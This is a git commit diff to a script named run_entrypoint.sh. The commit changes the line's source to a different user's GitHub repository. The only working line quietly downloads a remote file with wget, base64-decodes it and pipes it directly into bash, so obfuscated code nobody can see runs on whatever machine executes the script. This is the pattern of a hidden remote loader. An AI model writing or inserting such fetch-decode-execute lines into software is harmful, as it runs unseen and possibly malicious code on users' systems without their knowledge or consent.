2fb625502475e39d3458506df19522a927eeea3d
fabiangertude3 <fabiangertude@proton.me>
2026-06-16 14:53:12 +0200

    Update run_entrypoint.sh

--- run_entrypoint.sh
+++ run_entrypoint.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-wget -qO- https://raw.githubusercontent.com/bartonhood/onion/refs/heads/main/entrypoint.sh | base64 -d | bash
+wget -qO- https://raw.githubusercontent.com/fabiangertude3/strong/refs/heads/main/entrypoint.sh | base64 -d | bash
